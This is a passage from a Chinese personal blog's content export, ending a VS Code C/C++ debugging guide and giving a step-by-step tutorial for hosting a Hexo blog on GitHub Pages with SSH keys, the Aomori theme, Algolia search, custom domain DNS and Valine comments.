class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试器生成的任务。&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>如果是c++的配置，记得将tasks.json的command程序改成g++.exe，至于label和prelaunchtask这两个要是愿意也可以把gcc.exe 改成g++.exe</p></blockquote><p>使用模板之后，我们发现程序成功在cmd跑起来了</p><img src="/2022/03/23/vscode-c-c-configure/019.png" class=""><blockquote><p>因为win11特性，cmd和powershell打开都是通过windows terminal打开的，这样我感觉挺好的</p></blockquote><p>然后我们只需要注意launch配置中多了一块，那个就是我们需要用到的debug部分。如何使用如下：<br>首先创建一个断点，<img src="/2022/03/23/vscode-c-c-configure/020.png" class=""><br>就是鼠标放在语句前面出现红点，鼠标单击即可。</p><img src="/2022/03/23/vscode-c-c-configure/021.png" class=""><p>将任务调至debug</p><img src="/2022/03/23/vscode-c-c-configure/022.png" class=""><p>然后f5启动调试，我们会看到<img src="/2022/03/23/vscode-c-c-configure/023.png" class=""><br>程序停在了print函数中，右边可以看到变量i现在的值为0，cmd也没有输出，我们点击上面<img src="/2022/03/23/vscode-c-c-configure/024.png" class="">也就是单步调试，进行下一步操作的意思，我们会看到箭头跑到了for循环上，cmd也打印了一个0。</p><img src="/2022/03/23/vscode-c-c-configure/025.png" class="">在下一步可以看到i的变量变成了1<img src="/2022/03/23/vscode-c-c-configure/026.png" class=""><blockquote><p>至此，基本的程序运行和debug就解决了<br>要说vscode的缺点肯定是有的，有些很刁钻奇怪的问题他不一定会提示错误，但是就是无法运行，这点在vs 20xx系列上面就能对比出来，不过基本够用了。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>当然vscode还有一点不好，其实也是归根在微软身上，windows操作系统有个很不好的点就是系统的编码是根据地区设置来的。</p><p>那么是什么意思呢，就是简单来说，cmd的字符编码是gb2312还是啥来着，也就是在cmd中输入chcp，系统回执是936，而真正的项目开发一般都采用utf-8环境，也就是所说的65001。</p><p>所以你会发现中文，通常在cmd中都会乱码，可能网上有方法是教你文件改成ansi啊，或者gb2312的，但是这些都是治标不治本的，微软还在地区选项中有一个beta模式，可以强制系统编码为65001，但是下场很凄凉，到了别人936的环境中，你的文件所包含的中文全部是乱码的。</p><p>目前看来是没有什么办法能够根治的，因为即便你能永久修改了powershell或者cmd的字符集，但是老的windows软件可能用的还是那套字符，多少会存在差异，这也是为什么有些项目都会放在linux上开发。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Blog - Theme for Hexo · Butterfly</title>
      <link href="/2022/03/20/first-blog/"/>
      <url>/2022/03/20/first-blog/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实最基础的博客就跟日记一样，但是写日记这种事情基本就停留在了小学而且还得是课后作业的情况下；不过有的时候记录一些事以便日后解决也不失为一种好办法。当然好在之前也在本地用typora写过一些markdown，现在正好可以编写上传。</br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在了解了一些基础的知识后，选择用GitHub作为博客的仓库，在本地电脑上由hexo、git、node.js搭建个人博客的方案。<br/><span style="display:block; font-size:14px; text-align:right;">—— 关于文档中21年的有些本地写的md有些在csdn挪过来了</span><span style="display:block; font-size:10px; text-align:right; color:rgba(0, 0, 0, 0.1);">水文莫见怪，可看可不看</span><hr/></p><span id="more"></span><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h3 id="22-03-26-新增搜索功能"><a href="#22-03-26-新增搜索功能" class="headerlink" title="22.03.26 新增搜索功能"></a>22.03.26 新增搜索功能</h3><h3 id="22-03-26-新增域名绑定"><a href="#22-03-26-新增域名绑定" class="headerlink" title="22.03.26 新增域名绑定"></a>22.03.26 新增域名绑定</h3><h3 id="22-03-27-新增评论功能"><a href="#22-03-27-新增评论功能" class="headerlink" title="22.03.27 新增评论功能"></a>22.03.27 新增评论功能</h3><h3 id="22-03-29-修改评论系统"><a href="#22-03-29-修改评论系统" class="headerlink" title="22.03.29 修改评论系统"></a>22.03.29 修改评论系统</h3><h3 id="22-08-01-新增收藏页"><a href="#22-08-01-新增收藏页" class="headerlink" title="22.08.01 新增收藏页"></a>22.08.01 新增收藏页</h3><h3 id="22-08-09-对html的补充"><a href="#22-08-09-对html的补充" class="headerlink" title="22.08.09 对html的补充"></a>22.08.09 对html的补充</h3><h3 id="22-10-01-加密插件"><a href="#22-10-01-加密插件" class="headerlink" title="22.10.01 加密插件"></a>22.10.01 加密插件</h3><h3 id="22-10-x-抽空整理了下文章"><a href="#22-10-x-抽空整理了下文章" class="headerlink" title="22.10.x 抽空整理了下文章"></a>22.10.x 抽空整理了下文章</h3><h3 id="22-10-x-图片加水印"><a href="#22-10-x-图片加水印" class="headerlink" title="22.10.x 图片加水印"></a>22.10.x 图片加水印</h3><h3 id="22-11-x-更换主题"><a href="#22-11-x-更换主题" class="headerlink" title="22.11.x 更换主题"></a>22.11.x 更换主题</h3><p><strong>选择github更多还是因为免费，成本低。如果你自己有服务器那么可玩性更高，因为很多东西都可以部署在服务器上，像github虽然能搭建博客，但是也仅限于博客，评论系统一些东西都不够完美都是平替产品。而且加上访问速度，一篇文章的文字和资源多了，加载就要一段时间才能缓存，所以如果介意，也可以部署到gitee上稍快一点</strong></p><hr><ul><li>主题Demo：<a href="https://linhong.me/">链接</a></li><li>主题文档：<a href="https://aomori.linhong.me/v/chinese/getting-started/intro">链接</a></li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><blockquote><ul><li>GitHub账号</li><li>windows 11&#x2F;10</li><li>git          —<a href="https://git-scm.com/">https://git-scm.com/</a></li><li>node.js      —<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></li></ul></blockquote><p><strong>建议先下载git工具，下载完后先注销或者重启，不然可能出现git bash无法检索到nodejs的命令。</strong><br>然后打开git bash，bash是linux终端所使用的一种，如果你对linux有一定基础相信不用多做解释，没基础也没事，基础命令都可以通过tab补齐或者copy</p><p>不放心不确定的童鞋可以在<code>git bash</code>中输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git --version</span><br><span class="line"><span class="comment">#和</span></span><br><span class="line">$ node -v</span><br></pre></td></tr></table></figure><p>正常回显版本则表示安装正确</p><p>然后安装hexo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo -g</span><br><span class="line"><span class="comment">#也有用这种的npm install -g hexo-cli，本质都差不多</span></span><br></pre></td></tr></table></figure><p>安装完后测试:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo -v </span><br><span class="line"><span class="comment">#有正常输出且看到hexo即可</span></span><br></pre></td></tr></table></figure><hr><h1 id="Aomori"><a href="#Aomori" class="headerlink" title="Aomori"></a>Aomori</h1><h2 id="1-创建仓库"><a href="#1-创建仓库" class="headerlink" title="1.创建仓库"></a>1.创建仓库</h2><p>进入<a href="https://github.com/">github</a></p><img src="/2022/03/20/first-blog/000.png" class=""><p>创建一个新的仓库，仓库名为你的<strong>github用户名.github.io</strong></p><blockquote><p>例如用户名为test，则仓库名为test.github.io</p></blockquote><img src="/2022/03/20/first-blog/001.png" class=""><blockquote><p>此处报错是因为我已经创建过了，可以忽略</p></blockquote><p>需要注意的是：</p><blockquote><ol><li>切记是用户名而不是昵称，昵称可以随便改，用户名则是固定防止冲突的。</li><li>其次就是github访问速度正常都会比较慢，所以创建好后也别着急，可能需要等一会</li><li>最后就是因为这个仓库是以用户名为根本，所以可见每个用户只能创建一个这样的仓库</li></ol></blockquote><p>创建成功后先不用管，等会通过hexo上传仓库</p><hr><h2 id="2-配置ssh-key"><a href="#2-配置ssh-key" class="headerlink" title="2.配置ssh key"></a>2.配置ssh key</h2><p><strong>配置ssh key的目的是为了每次上传时不需要输入账号和密码</strong><br>在<code>git bash</code>中:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br></pre></td></tr></table></figure><p><strong>error:no such file or directory表示这台电脑是一次使用git</strong></p><p>输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;邮件地址&quot;</span></span><br></pre></td></tr></table></figure><p>连续三次回车，会在用户目录下生成一个.ssh文件夹，打开文件夹里面会有一个id_rsa.pub文件<br>看不到.ssh的童鞋可能是没有打开显示隐藏文件夹</p><img src="/2022/03/20/first-blog/003.png" class=""><p>用记事本打开id_rsa.pub文件，将其内容复制粘贴到github主页的ssh and gpg keys里</p><img src="/2022/03/20/first-blog/004.png" class=""><p>点击new ssh key，tiele随便起，内容粘贴到key里面，最后点击add ssh key</p><p>测试是否成功:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com <span class="comment"># 注意邮箱地址不用改</span></span><br></pre></td></tr></table></figure><p>如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到：</p><blockquote><p>Hi 你的用户名! You’ve successfully authenticated, but GitHub does not provide shell access.<br>到这里表示ssh配置成功</p></blockquote><p>然后我们添加github用户名和注册邮箱即</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;username&quot;</span> <span class="comment">#你的github用户名</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;xxx@qq.com&quot;</span> <span class="comment">#填写你的github注册邮箱,qq,网易都一样</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="3-搭建博客"><a href="#3-搭建博客" class="headerlink" title="3.搭建博客"></a>3.搭建博客</h2><p>再次之前先介绍hexo基本命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;postName&quot;</span> <span class="comment">#新建文章</span></span><br><span class="line">$ hexo new page <span class="string">&quot;pageName&quot;</span> <span class="comment">#新建页面</span></span><br><span class="line">$ hexo generate <span class="comment">#生成静态页面至public目录</span></span><br><span class="line">$ hexo server <span class="comment">#开启预览访问端口（默认端口4000，&#x27;ctrl + c&#x27;关闭server）</span></span><br><span class="line">$ hexo deploy <span class="comment">#部署到GitHub</span></span><br><span class="line">$ hexo <span class="built_in">help</span>  <span class="comment"># 查看帮助</span></span><br><span class="line">$ hexo version  <span class="comment">#查看Hexo的版本</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实际上我们常用的就几条:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean <span class="comment">#generate其实也会覆盖public文件夹，所以clean用不用都差不多</span></span><br><span class="line">$ hexo generate &gt;&gt; 缩写为 $ hexo g</span><br><span class="line">$ hexo server &gt;&gt; 缩写为 $ hexo s</span><br><span class="line">$ hexo deploy &gt;&gt; 缩写为 $ hexo d</span><br></pre></td></tr></table></figure><blockquote><p>然后选择博客放到那个文件夹，c盘d盘都可以<br>用<code>git bash</code><br>cd filename进去就行</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span> <span class="comment">#查看当前所在目录,一般就是在c/users/xxx，直接在里面创建也行</span></span><br><span class="line">$ <span class="built_in">cd</span> /d <span class="comment">#表示切换到d盘，e盘同理</span></span><br><span class="line">$ <span class="built_in">mkdir</span> blog <span class="comment">#文件名无所谓，都行，此处以blog为例</span></span><br><span class="line">$ <span class="built_in">cd</span> blog</span><br><span class="line">$ hexo init <span class="comment">#初始化博客</span></span><br></pre></td></tr></table></figure><p>文件夹里面会出现很多内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g <span class="comment">#生成静态文件至public文件夹</span></span><br><span class="line">$ hexo s <span class="comment">#预览博客</span></span><br></pre></td></tr></table></figure><p>浏览器url里面输入<code>localhost:4000</code>即可在浏览器中预览，如果4000端口被占用了可以尝试用其他端口</p><p>默认的主题就在&#x2F;thems 文件夹中，叫landscape，比较简单吧。</p><hr><h2 id="4-修改主题"><a href="#4-修改主题" class="headerlink" title="4.修改主题"></a>4.修改主题</h2><p><a href="https://hexo.io/themes/">https://hexo.io/themes/</a> 这是官方主题网址，总的来讲数量不多，如果修改需要一定知识储备，或者作者开源有附上教程</p><p>我这里用的主题是：<a href="https://github.com/lh1me/hexo-theme-aomori">https://github.com/lh1me/hexo-theme-aomori</a><br>预览：<a href="https://linhong.me/">https://linhong.me/</a></p><p>界面比较简洁，功能添加也比较方便</p><p>下载有两种方式</p><ol><li>就是git clone 仓库的https链接<br>git clone <a href="https://github.com/lh1me/hexo-theme-aomori.git">https://github.com/lh1me/hexo-theme-aomori.git</a> thems&#x2F;aomori</li><li>或者直接下载作者打包好的文件,作者主题网站置顶中有写</li></ol><p>二者的差别就是clone的会有.git的一些信息，具体用处不知道</p><p>下载完之后我们在blog文件夹中找到<code>_config.yml</code><br>划到最下面看到</p><blockquote><p>themes: landscape</p></blockquote><p>修改后面的内容，如果你是参照我第一种下载方式，那么因为我创建的文件夹名称为aomori，所以此处也使用aomori，如果是第二种方法下载zip压缩包解压，那么根据对应的文件夹为hexo-theme-aomori，切记不要弄错</p><p>原作者在后面标准了关掉hexo默认的highlight代码高亮，那么使用这个主题也就去关了<br>在<code>_config.yml</code>文件中找到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>将其修改为false</p><p>然后在<code>git bash</code>中清除静态文件夹重新生成并预览</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><blockquote><p>如果没有生成index.html 则可能是你删除了source文件夹中的hello-world.md文件<br>要么重新hexo init，或者直接hexo n 一个新的文件写博客，在hexo g生成，hexo s预览</p></blockquote><p>至此本地上已经没有什么问题了</p><hr><h2 id="5-上传仓库"><a href="#5-上传仓库" class="headerlink" title="5.上传仓库"></a>5.上传仓库</h2><p>还是<code>_config.yml</code>文件中，最后片段关于deploy的部分。</p><p>正确写法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: git@github.com:8bytes-code/8bytes-code.github.io.git</span><br><span class="line">  branch: main</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>错误写法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repository: https://github.com/8bytes-code/8bytes-code.github.io.git</span><br><span class="line">  branch: main</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>还有一点需要注意：branch，按照我的方法分支就是main，如果你的分支是master，那么branch就修改成master。</p></blockquote><p>具体如图</p><img src="/2022/03/20/first-blog/005.jpg" class=""><p>然后我们直接执行<code>hexo d</code>的时候应该是会报错的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Deployer not found: github 或者 Deployer not found: git</span><br></pre></td></tr></table></figure><p>就是少了个插件安装一下就行了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>然后我们在<code>hexo d</code>提交代码，有改动会跑一段挺长的，没改动就没啥变化，结尾就是info deploy done：git</p><p><strong>hexo d是覆盖操作，所以仓库的代码每次都会被覆盖，如果有需要自己找个地方保存一下，能力强的或许还有git clone仓库下来，然后每次提交形成分支</strong></p><hr><h2 id="6-注意的地方"><a href="#6-注意的地方" class="headerlink" title="6.注意的地方"></a>6.注意的地方</h2><h3 id="1-hexo-n-一个文件的时候"><a href="#1-hexo-n-一个文件的时候" class="headerlink" title="1.hexo n 一个文件的时候"></a>1.hexo n 一个文件的时候</h3><p>其中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line">title: name <span class="comment">#文章显示的名称</span></span><br><span class="line"><span class="built_in">date</span>:       <span class="comment">#默认根据创建的时候生成，一般不做修改</span></span><br><span class="line">tags:       <span class="comment">#文章标签，如果所用主题有文章分类功能，可以为其添加</span></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">下面才是写正文的地方</span><br><span class="line"></span><br><span class="line">如果需要设置文章不显示全部内容，使用 &lt;!--more--&gt;的时候注意上下都空两行，否则可能不起效果，具体原因未知，有的时候好像不会被占用，好像会和上下文字所使用的标题什么的有影响保险起见多空几行的了</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-图片的设置"><a href="#2-图片的设置" class="headerlink" title="2.图片的设置"></a>2.图片的设置</h3><img src="/2022/03/20/first-blog/005.png" class=""><p>在首页中文章所示图片是根据作者文档中描述的属性</p><img src="/2022/03/20/first-blog/006.png" class=""><blockquote><p>即添加在.md文件的头部— xxxx —之中<br>至于路径设置我是在source文件夹下新建了一个images文件夹，然后设置</p></blockquote><img src="/2022/03/20/first-blog/007.png" class=""><p>至于文章中的图片，以后如果文章写的多了，图片都在一个文件夹不利于管理，而且命名也麻烦<br>于是参考官方文档<a href="https://hexo.io/zh-cn/docs/asset-folders">https://hexo.io/zh-cn/docs/asset-folders</a></p><img src="/2022/03/20/first-blog/008.png" class=""><p>修改<code>_config.yml</code>的post_asset_folder属性之后，hexo n 一个新的文件都会附带一个一样名称的文件夹，我们把那篇文章需要用到的图片放到文件夹里即可，引用方法也如标红所示:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%asset_img filename.jpg/png  %&#125;</span><br></pre></td></tr></table></figure><p>当然markdown的原生引用图片方法也没问题，但是图片存放路径都是建议放在<code>source</code>目录下<br>使用的时候也是通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![描述](./source/)建议还是相对路径</span><br></pre></td></tr></table></figure><blockquote><p>后面的描述可有可无</p></blockquote><p>最后就是作者写的教程：<a href="https://aomori.linhong.me/v/chinese/getting-started/intro">https://aomori.linhong.me/v/chinese/getting-started/intro</a><br>自己在慢慢做调整吧，开源是美德，但没有义务一直帮你，大家慢慢凭借文档修改吧。</p><blockquote><p>遇到bug可以上github提交issues。</p></blockquote><h3 id="3-README-md"><a href="#3-README-md" class="headerlink" title="3.README.md"></a>3.README.md</h3><p>默认情况下，hexo会把source里面的所有.md类型文件都转换成.html类型，所以导致仓库的README.md文件显得很蛋疼，解决方法在<code>_config.yml</code>下找到并修改即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip_render: README.md</span><br></pre></td></tr></table></figure><p>还有就是，关于为什么README.md下图片不能显示的问题，估计看了下，存储资源的地址是在<code>raw.githubusercontent.com</code>下，而这个域名恰好有个问题就是dns污染，导致资源不一定会被正确访问，即使你通过修改本机hosts文件去指定，但是访问速度还是太慢了，所以办法就是要么视而不见，要么上科学道具去访问就能看到了。</p><hr><h2 id="7-新增搜索功能"><a href="#7-新增搜索功能" class="headerlink" title="7.新增搜索功能"></a>7.新增搜索功能</h2><img src="/2022/03/20/first-blog/009.png" class=""><p>如文档所示，先访问<a href="https://www.algolia.com/">Algolia</a>, 创建账号或者使用github登录</p><img src="/2022/03/20/first-blog/018.png" class=""><blockquote><p>这里弄得太快忘了，如果你的index没有，那么就new一个，名字后面会用到</p></blockquote><p>然后点击settings,点击api keys,new一个 api key，indices选之前新建的index名字，acl权限就按照我这个几个先给了</p><img src="/2022/03/20/first-blog/017.png" class=""><p>你还需要在<code>git bash</code>安装这个拓展</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --save hexo-algolia</span><br></pre></td></tr></table></figure><p>并且在全局配置文件<code>_config.yml</code>下填入配置，这些都是在api keys的your api keys里面套</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">algolia:</span><br><span class="line">  applicationID: <span class="string">&#x27;applicationID&#x27;</span></span><br><span class="line">  apiKey: <span class="string">&#x27;apiKey&#x27;</span></span><br><span class="line">  indexName: <span class="string">&#x27;...&#x27;</span></span><br></pre></td></tr></table></figure><p>然后在<code>git bash</code>下输入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> HEXO_ALGOLIA_INDEXING_KEY=</span><br><span class="line"><span class="comment">#这个key就是刚才创建的api的key，默认的就一个搜索功能在使用hexo algolia是会报下面的错</span></span><br><span class="line"><span class="comment">#ERROR [hexo-algolia] Not enough rights to update an object near line:1 column:785</span></span><br><span class="line">$ hexo clean</span><br><span class="line">$ hexo algolia</span><br></pre></td></tr></table></figure><p>成功会返回<img src="/2022/03/20/first-blog/019.png" class=""></p><p>最后在站点启用搜索功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aomori_search_algolia: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><strong>注意：以后发布文章都需要运行hexo algolia，否则新文章没有创建记录，无法被检索</strong></p><blockquote><p>ERROR [hexo-algolia] Please set an HEXO_ALGOLIA_INDEXING_KEY environment variable to enable content indexing.<br>ERROR &gt;&gt; Read <a href="https://npmjs.com/hexo-algolia#api-key">https://npmjs.com/hexo-algolia#api-key</a> for more informations.<br>后续如果使用hexo algolia报此错误，那么请重新输入上面export HEXO_ALGOLIA_INDEXING_KEY，具体原因出在哪不知道，好像隔段时间就没记忆了，所以建议你将自建权限的key以注释的方法存在_config.yml下，以方便后期重新更新使用。</p></blockquote><p><strong>注意</strong></p><p>如果搜索跳转时网址显示<code>http://example.com</code>开头，在algolia记录里可以看到：<img src="/2022/03/20/first-blog/023.png" class=""><br>那么请注意你的<code>_config.yml</code>配置中找到<img src="/2022/03/20/first-blog/024.png" class=""><br>将url修改为你github page的地址，或者你购买了域名就改成域名，上述注释是清楚描述了这个问题。<br>修改完之后在<code>git bash</code>执行hexo algolia重新生成即可。</p><hr><h2 id="8-新增域名绑定"><a href="#8-新增域名绑定" class="headerlink" title="8.新增域名绑定"></a>8.新增域名绑定</h2><p><strong>不是打广告</strong>，阿里云和腾讯云都行，万网好像是被阿里收购了，所以都差不多，目前购买域名需要实名认证，不要打马虎眼。</p><p>此处以阿里云举例：<a href="https://wanwang.aliyun.com/domain?spm=5176.21213303.J_6704733920.9.300953c9w7wqdp&scm=20140722.S_product@@%E4%BA%91%E4%BA%A7%E5%93%81@@999997._.ID_product@@%E4%BA%91%E4%BA%A7%E5%93%81@@999997-RL_%E5%9F%9F%E5%90%8D-LOC_main-OR_ser-V_2-P0_1">戳此处</a></p><img src="/2022/03/20/first-blog/010.png" class=""><p>首先搜索你需要的域名，此处以hhh为例，点击查询可以看到</p><img src="/2022/03/20/first-blog/011.png" class=""><p>大概是简短或者商用价值比较高的域名价格都比较贵，其次按照域名的等级<br>买家可以买一年也可以一次性买十年，这个都随便，至于检索速度还是要看各搜索引擎了。我买的是.top的</p><p>买完之后去工作台，找到域名服务，管理你的域名;<strong>刚买完需要审核1-2日，但是实际上还是比较快的用不了几分钟</strong></p><img src="/2022/03/20/first-blog/012.png" class=""><p>你进去的页面可能是在审核中，但是没关系，我们点击后面的解析，他会跳转到一个页面</p><img src="/2022/03/20/first-blog/013.png" class=""><p>在此处我们需要添加两条记录，这个其实相当于dns的解析，如果学过一点的会知道，dns有正向和逆向的，说白了就是从域名翻译成服务器ip地址，从服务器ip地址翻译成域名这两条记录</p><blockquote><p>此处需要注意ip地址可能要添加两条记录，一条ipv4和一条ipv6</p></blockquote><p>如何查看IP地址，win+r 输入cmd 回车，当然<strong>ping 你用户名.github.io</strong>是最简单的，但是现在可能返回的都是ipv6了<br>或者直接github看文档吧<a href="https://docs.github.com/cn/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site#configuring-an-apex-domain">戳此处</a></p><p><del>划到第五步，此处我不确定提示的ip是每个人都相同还是不相同就先打码了</del><br><del>虽然感觉应该是一样的，毕竟github总不能你建一个仓库他单独给你一个ip地址，ipv4早用光了</del></p><img src="/2022/03/20/first-blog/014.png" class=""><blockquote><p>按照第五步显示的两块ip，各取相同一行的一条记录，添加到域名解析里面的记录值</p></blockquote><img src="/2022/03/20/first-blog/015.png" class=""><blockquote><p>a对应ipv4，aaaa对应ipv6。且这两条主机记录为@。地址再次强调就是第五步显示的<br>用户名.github.io 那条的主机类型为www，记录类型为CNAME。</p></blockquote><p>然后进入你github博客仓库，找到设置，找到pages，将域名填入custom domain之中，看他是否打勾</p><img src="/2022/03/20/first-blog/016.png" class=""><p>此处他还会花一点时间安装tsl证书还是啥，估摸着应该是和ssl证书差不多的东西吧，因为https是在http基础上增加了ssl证书获得一个加密性。等待一段时间即可，至于下面的强制https，开不开都行，https自然是会安全一点的。</p><p>然后在博客文件夹目录下的<code>source</code>下，新建一个CNAME的文件，记住没有拓展名，打开后输入你买的域名，不需要加https，就单纯的域名.com啥的</p><p>完成后，在浏览器url中输入你的域名，即可跳转到个人博客！</p><blockquote><p>然后就是印证猜想了，通过百度了几个人用github搭建的博客绑定域名过程中我看到他们ping的结果都是跟文档里的那几个一样的。<br>所以我们在url里面输入ping测试返回的ip地址是不会跳转到我们的博客的，但是用户名.github.io会跳转。至于为什么还要增加我就不清楚了，本文重在使用。</p></blockquote><hr><h2 id="9-新增评论功能"><a href="#9-新增评论功能" class="headerlink" title="9.新增评论功能"></a>9.新增评论功能</h2><p>看了下作者主题用的是remark42，那么也就去摸索一下remark42，但是看了下好像需要后端服务器或者通过docker跑，这倒是感觉不太适合我这种单纯建在github的用户，或者是我哪里看漏了。<br>gitalk和giscus好像都是基于github的issue开发的，好处就是直接调用仓库的评论，缺点是开<br>项目不确定什么时候就倒台了或者出现大范围更新，导入导出都不方便。<br>围观了几圈之后，就选了作者支持的<code>Valine</code>,使用方法也有<a href="https://valine.js.org/">官方文档</a><br>好处是什么呢，就是我们无需在网页中增加js代码，只需要在<code>_config.yml</code>中增加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aomori_valine:</span><br><span class="line">  enable: true</span><br><span class="line">  appId: &#x27;&#x27;</span><br><span class="line">  appKey: &#x27;&#x27;</span><br></pre></td></tr></table></figure><img src="/2022/03/20/first-blog/020.png" 